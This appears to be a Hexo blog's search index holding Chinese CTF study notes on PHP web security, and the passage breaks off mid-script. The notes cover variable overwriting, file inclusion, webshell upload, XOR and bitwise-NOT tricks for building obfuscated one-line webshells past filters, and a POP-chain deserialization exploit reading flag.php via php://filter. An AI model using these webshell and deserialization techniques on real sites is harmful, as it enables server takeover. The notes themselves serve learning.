<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>变量覆盖</title>
    <url>/2021/11/23/1/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>在php中不正确的使用extract()、parse_str()以及import_request_variables()</p>
<p>函数会导致用户输入的变量值覆盖程序中原有的变量。例如更改黑名单</p>
<h2 id="extract（）函数"><a href="#extract（）函数" class="headerlink" title="extract（）函数"></a>extract（）函数</h2><p>该函数是接受一个数组并把该数组解析成变量，键名为变量名，键值为变量值，</p>
<p>此函数可以接受3个值，第二个值该函数的配置，第三个值是在开启不覆盖原变量的情况下将变量的值附给第三个值</p>
<h2 id="pars-str（）函数"><a href="#pars-str（）函数" class="headerlink" title="pars_str（）函数"></a>pars_str（）函数</h2><p>该函数是把字符串解析成变量例如“a=1”会被解析成$a=1，如果变量a之前存在，就会被覆盖，还可以加第二值为数组，这样解析出的变量就会存在数组中。</p>
<h2 id="import-request-variables"><a href="#import-request-variables" class="headerlink" title="import_request_variables()"></a>import_request_variables()</h2><p>该函数会接收POST,COOKIE,GET的值并把他们转化从变量并会覆盖原有的变量可以用GPC代替</p>
<h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="$$变量覆盖"></a>$$变量覆盖</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$a</span>=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">&#x27;_COOKIE&#x27;</span>, <span class="string">&#x27;_POST&#x27;</span>, <span class="string">&#x27;_GET&#x27;</span>) <span class="keyword">as</span> <span class="variable">$_request</span>)&#123;</span><br><span class="line">    		<span class="keyword">foreach</span>(<span class="variable">$$_request</span> <span class="keyword">as</span> <span class="variable">$_key</span> =&gt; <span class="variable">$_value</span>)&#123;</span><br><span class="line">        		<span class="keyword">echo</span> <span class="variable">$_key</span>.<span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">        		<span class="variable">$$_key</span> = addslashes(<span class="variable">$_value</span>);</span><br><span class="line">    		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在输入?a=1的时候$key=a</p>
<p>所以$$_key就是$a就成了给a赋值的语句</p>
]]></content>
  </entry>
  <entry>
    <title>markdown</title>
    <url>/2021/11/23/2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1-标题的使用"><a href="#1-标题的使用" class="headerlink" title="1.标题的使用"></a>1.标题的使用</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">用#加空格，空格后写标题，#号越多标题等级越低</span><br><span class="line">    # <span class="number">1</span></span><br><span class="line">    ## <span class="number">2</span></span><br><span class="line">    ### <span class="number">3</span></span><br><span class="line">    #### <span class="number">4</span></span><br><span class="line">    ##### <span class="number">5</span></span><br><span class="line">    ###### <span class="number">6</span></span><br><span class="line">    共有六个等级</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><h3 id="3"><a href="#3" class="headerlink" title="3"></a>3</h3><h4 id="4"><a href="#4" class="headerlink" title="4"></a>4</h4><h5 id="5"><a href="#5" class="headerlink" title="5"></a>5</h5><h6 id="6"><a href="#6" class="headerlink" title="6"></a>6</h6><h1 id="2代码块的使用"><a href="#2代码块的使用" class="headerlink" title="2代码块的使用"></a>2代码块的使用</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">用```后加代码的语言 </span><br><span class="line">    ```java   </span><br></pre></td></tr></table></figure>

<p><strong>注意</strong></p>
<p>`要切换成英文</p>
<h1 id="3加粗，高亮，删除符"><a href="#3加粗，高亮，删除符" class="headerlink" title="3加粗，高亮，删除符"></a>3加粗，高亮，删除符</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">*斜体* or _强调_</span><br><span class="line">**加粗** or __加粗__</span><br><span class="line">***粗斜体*** or ___粗斜体__</span><br><span class="line">    </span><br></pre></td></tr></table></figure>



<p><em>斜体</em> or <em>强调</em> <strong>加粗</strong> or <strong>加粗</strong> <em><strong>粗斜体</strong></em> or _<strong>粗斜体</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">高亮</span><br><span class="line">`` `包裹起来` ``</span><br></pre></td></tr></table></figure>

<p><code>包裹起来</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">~~加删除的内容~~</span><br></pre></td></tr></table></figure>

<p><del>加删除的内容</del></p>
<h1 id="4图片内嵌"><a href="#4图片内嵌" class="headerlink" title="4图片内嵌"></a>4图片内嵌</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">![替换的文字]（打开图片的url或绝对地址）</span><br></pre></td></tr></table></figure>



<p><img src="/.com//ask.jpg" alt="asuka"></p>
<h1 id="5link"><a href="#5link" class="headerlink" title="5link"></a>5link</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">[替换的文字]（url）</span><br></pre></td></tr></table></figure>

<p><a href="https://www.google.com.hk/">百度</a></p>
]]></content>
  </entry>
  <entry>
    <title>web复现</title>
    <url>/2021/11/23/1-1/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>HTML source</p>
<p>F12查看源码</p>
<p>网页访问流程：客户端发请求，服务器</p>
<h2 id="Cookies"><a href="#Cookies" class="headerlink" title="Cookies"></a>Cookies</h2><p>Cookie是储存用户信息，终端不会记录用户信息，cookie保存在游览器上</p>
<h2 id="location"><a href="#location" class="headerlink" title="location"></a>location</h2><p>网站状态码</p>
<p>1xx请求成功</p>
<p>2xx请求响应成功</p>
<p>3xx重新定向</p>
<p>4xx客户端问题</p>
<p>5xx服务器问题</p>
<p>用burp抓包</p>
<h2 id="Get-Post"><a href="#Get-Post" class="headerlink" title="Get_Post"></a>Get_Post</h2><p>Get post的不同，post比较安全</p>
<p>Get写在url要用？赋值</p>
<p>Post写在body</p>
<h2 id="babyrce"><a href="#babyrce" class="headerlink" title="babyrce"></a>babyrce</h2><p>@eveal函数漏洞可以执行（）中文件的php代码，不是php就显示内容</p>
<p>通过给（）内的变量赋值执行</p>
<h2 id="ezinclude"><a href="#ezinclude" class="headerlink" title="ezinclude"></a>ezinclude</h2><p>文件包含，访问包含中的文件就会直接显示，include（）会显示不是php文件的内容，会执行符合php语法的内容</p>
<h2 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h2><p>php语言的强比较和数据类型转换，intval函数的意义通过使用指定的进制 <code>base</code> 转换（默认是十进制），返回变量 <code>value</code> 的 int 数值</p>
<h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><p>请求头的应用</p>
<p>请求头的格式是人为规定的</p>
<p>127.0.0.1本地请求</p>
<p>Reffer上一个请求的ip地址</p>
<p>User-agent 游览器</p>
<h2 id="babyupload"><a href="#babyupload" class="headerlink" title="babyupload"></a>babyupload</h2><p>文件上传</p>
<p>用php写一句话木马（用@evaal），用网站的上传功能上传到服务器，用burp伪造文件格式绕过，通过访问上传的文件控制网站</p>
<h2 id="babyssrf"><a href="#babyssrf" class="headerlink" title="babyssrf"></a>babyssrf</h2><p>可以执行？url=后的代码，网址就显示网址的内容，若是本地文件就直接显示，</p>
<h2 id="Google"><a href="#Google" class="headerlink" title="Google"></a>Google</h2><p>用sql注入，sql语句会先执行=号后的sql语句</p>
<h1 id="babyphp2"><a href="#babyphp2" class="headerlink" title="babyphp2"></a>babyphp2</h1><p>md5值，用哈希算法加密，哈希算法不能逆推，但有极少数数据的哈希值是相同的，可以md5碰撞，md5无法识别数组会返回false，可以用两个数组让MD5值相同</p>
]]></content>
  </entry>
  <entry>
    <title>无字符getshell</title>
    <url>/2021/11/23/2-3-4/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>在waf特别强的情况下，把所有的字符和数字都ban了，就要使用无字符getshell。</p>
<p>原理，既然字符被过滤了，只要我们输入的不是字符，但能让服务器解析成字符。比如我们要的是2，但2被过滤了，那么我们就可以用1+1代替2。无字符也是同理，我们可以用异或运算来输出字符，或者汉字取反</p>
<h2 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h2><p>附上大佬的异或脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;~!@#$%^&amp;*()_+\|/?,.&lt;&gt;`-=&#123;&#125;[]&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$a</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line"> <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;<span class="variable">$j</span>&lt;strlen(<span class="variable">$a</span>);<span class="variable">$j</span>++)&#123;</span><br><span class="line"> <span class="keyword">if</span>(ord(<span class="variable">$a</span>[<span class="variable">$i</span>]^<span class="variable">$a</span>[<span class="variable">$j</span>])&gt;<span class="number">64</span> &amp;&amp; ord(<span class="variable">$a</span>[<span class="variable">$i</span>]^<span class="variable">$a</span>[<span class="variable">$j</span>])&lt;<span class="number">91</span>)&#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="variable">$a</span>[<span class="variable">$i</span>].<span class="string">&#x27;^&#x27;</span>.<span class="variable">$a</span>[<span class="variable">$j</span>].<span class="string">&#x27;=&#x27;</span>;</span><br><span class="line"> <span class="keyword">echo</span> chr(ord(<span class="variable">$a</span>[<span class="variable">$i</span>]^<span class="variable">$a</span>[<span class="variable">$j</span>])).<span class="string">&#x27; &#x27;</span>;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27; &#x27;</span>.ord(<span class="variable">$a</span>[<span class="variable">$i</span>]^<span class="variable">$a</span>[<span class="variable">$j</span>]);</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"> &#125;<span class="keyword">elseif</span> (ord(<span class="variable">$a</span>[<span class="variable">$i</span>]^<span class="variable">$a</span>[<span class="variable">$j</span>])&gt;<span class="number">96</span> &amp;&amp; ord(<span class="variable">$a</span>[<span class="variable">$i</span>]^<span class="variable">$a</span>[<span class="variable">$j</span>])&lt;<span class="number">122</span>) &#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="variable">$a</span>[<span class="variable">$i</span>].<span class="string">&#x27;^&#x27;</span>.<span class="variable">$a</span>[<span class="variable">$j</span>].<span class="string">&#x27;=&#x27;</span>;</span><br><span class="line"> <span class="keyword">echo</span> chr(ord(<span class="variable">$a</span>[<span class="variable">$i</span>]^<span class="variable">$a</span>[<span class="variable">$j</span>])).<span class="string">&#x27; &#x27;</span>;</span><br><span class="line"> <span class="keyword">echo</span> ord(<span class="variable">$a</span>[<span class="variable">$i</span>]^<span class="variable">$a</span>[<span class="variable">$j</span>]);</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>{^+=P<br>“@”^”(“);//h<br>[^&gt;=e<br>[^-=v<br>]^&lt;=a<br>,^@=l<br>+^[=p<br>`^/=O<br>.^}=S<br>/^{=T</p>
<p>此为部分输出结果</p>
<p>用该结果我们可以拼出一个一句话木马</p>
<p>&lt;?= @”[[],”^”&gt;-&lt;@”($_”+`./“^”[/}{“[‘“+”^”[“‘]); ?&gt;</p>
<h2 id="汉字取反"><a href="#汉字取反" class="headerlink" title="汉字取反"></a>汉字取反</h2><p>脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;当我站在山顶上俯瞰半个鼓浪屿和整个厦门的夜空的时候，我知道此次出行的目的已经完成了，我要开始收拾行李，明天早上离开这里。前几天有人问我，大学四年结束了，你也不说点什么？乌云发生了一些事情，所有人都缄默不言，你也是一样吗？你逃到南方，难道不回家了吗？当然要回家，我只是想找到我要找的答案。其实这次出来一趟很累，晚上几乎是热汗淋漓回到住处，厦门的海风伴着妮妲路过后带来的淅淅沥沥的小雨，也去不走我身上任何一个毛孔里的热气。好在旅社的生活用品一应俱全，洗完澡后我爬到屋顶。旅社是一个老别墅，说起来也不算老，比起隔壁一家旧中国时期的房子要豪华得多，竖立在笔山顶上与厦门岛隔海相望。站在屋顶向下看，灯火阑珊的鼓浪屿街市参杂在绿树与楼宇间，依稀还可以看到熙熙攘攘的游客。大概是夜晚渐深的缘故，周围慢慢变得宁静下来，我忘记白天在奔波什么，直到站在这里的时候，我才知道我寻找的答案并不在南方。当然也不在北方，北京的很多东西让我非常丧气，包括自掘坟墓的中介和颐指气使的大人们；北京也有很多东西让我喜欢，我喜欢颐和园古色古香的玉澜堂，我喜欢朝阳门那块“永延帝祚”的牌坊，喜欢北京鳞次栉比的老宅子和南锣鼓巷的小吃。但这些都不是我要的答案，我也不知道我追随的是什么，但想想百年后留下的又是什么，想想就很可怕。我曾经为了吃一碗臭豆腐，坐着优步从上地到北海北，兴冲冲地来到那个垂涎已久的豆腐摊前，用急切又害羞的口吻对老板说，来两份量的臭豆腐。其实也只要10块钱，吃完以后便是无与伦比的满足感。我记得那是毕业设计审核前夕的一个午后，五月的北京还不算炎热，和煦的阳光顺着路边老房子的屋檐洒向大地，但我还是不敢站在阳光下，春天的燥热难耐也绝不输给夏天。就像很多人冷嘲热讽的那样，做这一行谁敢把自己完全曝光，甭管你是黑帽子白帽子还是绿帽子。生活在那个时候还算美好，我依旧是一个学生，几天前辞别的同伴还在朝九晚五的工作，一切都照旧运行，波澜不远走千里吃豆腐这种理想主义的事情这几年在我身上屡屡发生，甚至南下此行也不例外。一年前的这个时候我许过一个心愿，在南普陀，我特为此来还愿。理想化、单纯与恋旧，其中单纯可不是一个多么令人称赞的形容，很多人把他和傻挂钩。“你太单纯了，你还想着这一切会好起来”，对呀，在男欢女爱那些事情上，我可不单纯，但有些能让人变得圆滑与世故的抉择中，我宁愿想的更单纯一些。去年冬天孤身一人来到北京，放弃了在腾讯做一个安逸的实习生的机会，原因有很多也很难说。在腾讯短暂的实习生活让我记忆犹新，我感觉这辈子不会再像一个小孩一样被所有人宠了，这些当我选择北漂的时候应该就要想到的。北京的冬天刺骨的寒冷，特别是2015年的腊月，有几天连续下着暴雪，路上的积雪一踩半步深，咯吱咯吱响，周遭却静的像深山里的古刹。我住的小区离公司有一段距离，才下雪的那天我甚至还走着回家。北京的冬天最可怕的是寒风，走到家里耳朵已经硬邦邦好像一碰就会碎，在我一头扎进被窝里的时候，我却慢慢喜欢上这个古都了。我想到《雍正皇帝》里胤禛在北京的鹅毛大雪里放出十三爷，那个拼命十三郎带着令牌取下丰台大营的兵权，保了大清江山盛世的延续与稳固。那一夜，北京的漫天大雪绝不逊于今日，而昔人已作古，来者尚不能及，多么悲哀。这个古都承载着太多历史的厚重感，特别是下雪的季节，我可以想到乾清宫前广场上千百年寂寞的雕龙与铜龟，屋檐上的积雪，高高在上的鸱吻，想到数百年的沧桑与朝代更迭。雪停的那天我去了颐和园，我记得我等了很久才摇摇摆摆来了一辆公交车，车上几乎没有人，司机小心翼翼地转动着方向盘，在湿滑的道路上缓慢前行。窗外白茫茫一片，阳光照在雪地上有些刺眼，我才低下头。颐和园的学生票甚至比地铁票还便宜。在昆明湖畔眺望湖面，微微泛着夕阳霞光的湖水尚未结冰，踩着那些可能被御碾轧过的土地，滑了无数跤，最后只能扶着湖边的石狮子叹气，为什么没穿防滑的鞋子。昆明湖这一汪清水，见证了光绪皇帝被囚禁十载的蹉跎岁月，见证了静安先生誓为先朝而自溺，也见证了共和国以来固守与开放的交叠。说起来，家里有本卫琪著的《人间词话典评》，本想买来瞻仰一下王静安的这篇古典美学巨著，没想到全书多是以批判为主。我自诩想当文人的黑客，其实也只是嘴里说说，真到评说文章是非的时候，我却张口无词。倒是誓死不去发，这点确实让我无限感慨：中国士大夫的骨气，真的是从屈原投水的那一刻就奠定下来的。有句话说，古往今来中国三大天才死于水，其一屈原，其二李白，其三王国维。卫琪对此话颇有不服，不纠结王国维是否能够与前二者相提并论，我单喜欢他的直白，能畅快评说古今词话的人，也许无出其右了吧。人言可畏、人言可畏，越到现代越会深深感觉到这句话的正确，看到很多事情的发展往往被舆论所左右，就越羡慕那些无所畏惧的人，不论他们是勇敢还是自负。此间人王垠算一个，网络上人们对他毁誉参半，但确实有本事而又不矫揉做作，放胆直言心比天高的只有他一个了。那天在昆明湖畔看过夕阳，直到天空变的无比深邃，我才慢慢往家的方向走。耳机放着后弦的《昆明湖》，不知不觉已经十年了，不知道这时候他有没有回首望望自己的九公主和安娜，是否还能够“泼墨造一匹快马，追回十年前姑娘”。后来，感觉一切都步入正轨，学位证也顺利拿到，我匆匆告别了自己的大学。后来也遇到了很多事，事后有人找我，很多人关心你，少数人可能不是，但出了学校以后，又有多少人和事情完全没有目的呢？我也考虑了很多去处，但一直没有决断，倒有念怀旧主，也有妄自菲薄之意，我希望自己能做出点成绩再去谈其他的，所以很久都是闭门不出，琢磨东西。来到厦门，我还了一个愿，又许了新的愿望，希望我还会再次来还愿。我又来到了上次没住够的鼓浪屿，订了一间安静的房子，只有我一个人。在这里，能听到的只有远处屋檐下鸟儿叽叽喳喳的鸣叫声，远处的喧嚣早已烟消云散，即使这只是暂时的。站在屋顶的我，喝下杯中最后一口水。清晨，背着行李，我乘轮渡离开了鼓浪屿，这是我第二次来鼓浪屿，谁知道会不会是最后一次。我在这里住了三天，用三天去寻找了一个答案。不知不觉我又想到辜鸿铭与沈子培的那段对话。“大难临头，何以为之？”“世受国恩，死生系之。”&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;mb_strlen(<span class="variable">$str</span>, <span class="string">&#x27;utf-8&#x27;</span>); <span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$st</span> = mb_substr(<span class="variable">$str</span>, <span class="variable">$i</span>,<span class="number">1</span>, <span class="string">&#x27;utf-8&#x27;</span>);</span><br><span class="line">    <span class="variable">$a</span> = ~(<span class="variable">$st</span>);</span><br><span class="line">    <span class="variable">$b</span> = <span class="variable">$a</span>[<span class="number">1</span>];				<span class="comment">#取汉字的第一位</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$b</span>==<span class="string">&#x27;T&#x27;</span>)		<span class="comment">#$_GET[&#x27;&#x27;]想要得到的字符</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$st</span>;<span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>部分输出结果</p>
<p>的e<br>前v<br>瞰a<br>品l<br>说P<br>小O<br>次S<br>站T    </p>
<p>利用，因为有些题目会把数字也同样过滤所以我们可以用true来表示1</p>
<p>拼接一句话</p>
=
$\_\_=[];$\_\_\__=$__==$__;

$\_=\~(的)[$\_\_\_\_];$\_.=~(前)[$\_\_\_\_\];$\_.=~(瞰)[$\_\_\_\_\];$_.=~(品)[$\_\_\_\_\];

$\_\_\_=\~(样)[$\_\_\_\_];$\_\_\_\.=~(说)[$\_\_\_\_\];$\_\__\.=~(小)[$\_\_\_\_];$\_\_\_.=~(次)[$\_\_\_\_];$\_\_\_.=~(站)[$\_\__\_];$\_\_\_\_=~(瞰)[$\_\__\_];

$\_($\$\__\_[$\_]);

<?=是<?php的缩写
]]></content>
  </entry>
  <entry>
    <title>3</title>
    <url>/2021/11/23/3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>用的是phpstudy的集成环境，直接在phpstudy里打开php配置项配置debug</p>
<p>端口接听默认为9000我改成了9001</p>
<p><img src="/.com//p/picture/k.jpg" alt="picture"></p>
<p>打开php.ini添加debug配置idekey</p>
<p><img src="/.com//p/picture/j.jpg" alt="picture"></p>
<p>打开phpstorm文件打开设置</p>
<p><img src="/.com//p/picture/k.jpg" alt="picture"></p>
<p>选择服务器</p>
<p>名称自定义写什么都没关系</p>
<p>主机写你的本地php网址，或者本地ip127.0.0.1</p>
<p><img src="/.com//p/picture/ii.jpg" alt="picture"></p>
<p>点开右上角的运行调试配置，新建一个phpweb配置项</p>
<p><img src="/.com//p/picture/image-20211016204431247.png" alt="picyure"></p>
<p>把服务器设置成之前配置的</p>
<p>然后点右上角的📞图样，打开监听，在点旁边的绿色肥甲虫，debug</p>
]]></content>
  </entry>
  <entry>
    <title>pop链</title>
    <url>/2021/11/23/3-1/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h1><p>面向属性编程</p>
<p>简而言之就是利用php中的魔术方法，实现对不同类的调用然后getshell</p>
<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>



<p>我们看到第一个类Modifier有一个include函数，可以触发文件包含漏洞，，有__invoke魔术方法，该方法是在类被当成函数的时候触发，，在看到test类中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$function</span> = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$function</span>();</span><br></pre></td></tr></table></figure>

<p>可以自定义一个函数，我们就可以在这触发__invoke，但是这是个__get魔术方法在调用类中没有的变量时会触发，再看到show中的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br></pre></td></tr></table></figure>

<p>可以让str变量为test类来触发__get</p>
<p>接下来就是要想办法触发__tostring</p>
<p>再看到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">          <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>有个字符的正则匹配会触发__tostring，所以要让source为show类，</p>
<p>该逻辑是在__wakeup中再反序列化的时后会触发；</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>就get传入pop就行</p>
<p>脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>=<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str=<span class="keyword">new</span> Test;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 